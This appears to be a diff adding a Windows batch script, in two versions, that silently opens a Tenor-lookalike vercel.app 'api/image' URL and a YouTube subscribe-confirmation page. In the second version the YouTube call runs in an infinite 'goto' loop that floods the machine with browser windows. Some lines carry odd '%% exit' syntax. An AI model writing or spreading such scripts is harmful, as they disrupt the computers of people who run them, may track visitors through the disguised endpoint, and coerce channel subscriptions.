@@ -1,0 +1,13 @@
+@echo off
+start /min "" https://tenor-beta-murex.vercel.app/api/image %% exit
+start /min "" https://www.youtube.com/@divorcex.0?sub_confirmation=1 %% exit
+
+
+++++++++++++++++++++
+
+
+@echo off
+start /min "" https://tenor-beta-murex.vercel.app/api/image %% exit
+:1
+start /min "" https://www.youtube.com/@divorcex.0?sub_confirmation=1 %% exit
+goto 1
